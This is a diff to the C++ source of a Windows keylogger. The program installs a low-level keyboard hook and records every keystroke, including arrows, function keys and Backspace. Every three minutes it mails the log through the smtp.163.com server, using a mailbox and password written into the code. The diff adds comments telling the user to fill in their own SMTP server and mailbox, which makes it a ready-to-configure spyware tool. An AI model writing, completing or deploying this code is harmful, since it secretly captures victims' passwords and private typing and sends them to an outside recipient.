@@ -6,11 +6,11 @@
 #include <sstream>
 #include <iostream>
 #include "mail.h"
-#include "ProcessTrace.h"
 #pragma comment(lib,"ws2_32.lib")
 using namespace std;
 
 #define   _WIN32_WINNT  0x0500 
+
 bool Control;
 bool shouldend = false;
 HHOOK MyHook;
@@ -19,22 +19,24 @@ char HostName[100];
 bool Entered;
 int lasttime;
 HOSTENT * LocalHost;
+
 int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam3);
 ostringstream sout;
 
 void SendHookMail();
 
+//Terminate signal received
 void EndProgram()
 {
 	SendHookMail();
 	exit(0);
 }
 
+//Send result to mail
 void SendHookMail()
 {
-
 	HookData = sout.str();
-	SendEmail("smtp.163.com", "myhookmail@163.com", "abcdefg", "myhookmail@163.com", HookData);
+	SendEmail("smtp.163.com"/*TODO: Replace with your own mailbox's SMTP server*/, "myhookmail@163.com" /*Your own mailbox that you want to send from*/, "abcdefg" /*Your mail password*/, "myhookmail@163.com" /*Mailbox that you want to send results to*/, HookData);
 	sout.flush();
 }
 
@@ -67,121 +69,75 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 
 int CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	//Send a mail every 3 minutes if any key is pressed
 	if (time(0) - lasttime >= 180 && Entered)
 	{
 		SendHookMail();
 		Entered = false;
 	}
-	if (!Entered)
-	{
-		Entered = true;
-		lasttime = time(0);
-	}
+	//Terminate signal received. Send the last characters and exit the program
 	if (shouldend)
 	{
 		UnhookWindowsHookEx(MyHook);
 		EndProgram();
 	}
+//Macro definition to output the key ID to the output string
+#define KEY_STRING_PAIR(_Key, _String) \
+case _Key:	\
+	sout << _String;  \
+	break;
+	//If a key is pressed the "wParam == WM_KEYDOWN" condition is satisfied and will go into the switch 
 	if (wParam == WM_KEYDOWN)
 	{
+		if (!Entered)
+		{
+			Entered = true;
+			lasttime = time(0);
+		}
 		int code = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
 		switch (code)
 		{
 		case 160:
-		case VK_SHIFT:
-			sout <<"[Shift]";
-			break;
-		case VK_DOWN:
-			sout << "[DOWN]";
-			break;
-		case VK_UP:
-			sout << "[UP]";
-			break;
-		case VK_LEFT:
-			sout << "[LEFT]";
-			break;
-		case VK_RIGHT:
-			sout << "[RIGHT]";
-			break;
-		case VK_OEM_PERIOD:
-			sout <<".";
-			break;
-		case VK_OEM_1:
-			sout <<";";
-			break;
-		case VK_OEM_2:
-			sout <<"/";
-			break;
+		KEY_STRING_PAIR(VK_SHIFT, "[Shift]")
+		KEY_STRING_PAIR(VK_DOWN, "[Down]")
+		KEY_STRING_PAIR(VK_UP, "[Up]")
+		KEY_STRING_PAIR(VK_LEFT, "[Left]")
+		KEY_STRING_PAIR(VK_RIGHT, "[Right]")
+		KEY_STRING_PAIR(VK_OEM_PERIOD, ".")
+		KEY_STRING_PAIR(VK_OEM_1, ";")
+		KEY_STRING_PAIR(VK_OEM_2, "/")
+		//The terminate signal is Control + ~
 		case VK_OEM_3:
 			sout <<"~";
 			if (Control)
 				shouldend = true;
 			break;
-		case VK_OEM_4:
-			sout <<"[";
-			break;
-		case VK_OEM_5:
-			sout <<"\\";
-			break;
-		case VK_OEM_6:
-			sout <<"]";
-			break;
-		case VK_OEM_7:
-			sout <<"'";
-			break;
-		case VK_OEM_COMMA:
-			sout <<",";
-			break;
-		case VK_OEM_PLUS:
-			sout <<"+";
-			break;
-		case VK_OEM_MINUS:
-			sout <<"-";
-			break;
-		case 9:
-			sout <<"\\t";
-			break;
-		case VK_BACK:
-			sout <<"[Delete]";
-			break;
-		case VK_RETURN:
-			sout <<"[Enter]";
-			break;
-		case VK_CONTROL:
+		KEY_STRING_PAIR(VK_OEM_4, "[")
+		KEY_STRING_PAIR(VK_OEM_5, "\\")
+		KEY_STRING_PAIR(VK_OEM_6, "]")
+		KEY_STRING_PAIR(VK_OEM_7, "'")
+		KEY_STRING_PAIR(VK_OEM_8, ",")
+		KEY_STRING_PAIR(VK_OEM_COMMA, ",")
+		KEY_STRING_PAIR(VK_OEM_PLUS, "+")
+		KEY_STRING_PAIR(VK_OEM_MINUS, "-")
+		KEY_STRING_PAIR(VK_TAB, "[Tab]")
+		KEY_STRING_PAIR(VK_BACK, "[Backspace]")
+		KEY_STRING_PAIR(VK_RETURN, "[Enter]")
 		case 162:
+		case VK_CONTROL:
 			Control = true;
 			sout <<"[Control]";
 			break;
-		case VK_ESCAPE:
-			sout <<"[ESC]";
-			break;
+		KEY_STRING_PAIR(VK_ESCAPE, "[Esc]")
 		case 91:
-			sout <<"[HOME]";
-			break;
-		case 20:
-			sout <<"[CAPS LOCK]";
-			break;
-		case VK_ADD:
-			sout << "+";
-			break;
-		case VK_SUBTRACT:
-			sout << "-";
-			break;
-		case VK_MULTIPLY:
-			sout << "*";
-			break;
-		case VK_DECIMAL:
-			sout << ".";
-			break;
-		case VK_DIVIDE:
-			sout << "/";
-			break;
-		case 0x21:
-			sout << "[PAGE UP]";
-			break;
-		case 0x22:
-			sout << "[PAGE DOWN]";
-			break;
+		KEY_STRING_PAIR(VK_HOME, "[HOME]")
+		KEY_STRING_PAIR(VK_ADD, "+")
+		KEY_STRING_PAIR(VK_SUBTRACT, "-")
+		KEY_STRING_PAIR(VK_MULTIPLY, "*")
+		KEY_STRING_PAIR(VK_DECIMAL, ".")
+		KEY_STRING_PAIR(VK_DIVIDE, "/")
+		KEY_STRING_PAIR(0x21, "[PAGE UP]")
+		KEY_STRING_PAIR(0x22, "[PAGE DOWN]")
 		default:
 			if (code > 111 && code < 124)
 				sout << "[F" << code - 111 << "]";
@@ -191,7 +147,9 @@ int CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				sout << (char)code;
 		}
 	}
+	//Control is released
 	if (wParam == WM_KEYUP && (((KBDLLHOOKSTRUCT*)lParam)->vkCode == VK_CONTROL || ((KBDLLHOOKSTRUCT*)lParam)->vkCode == 162))
 		Control = false;
+	//Have to be done to prevent system from becoming useless
 	return CallNextHookEx(MyHook, nCode, wParam, lParam);
 }
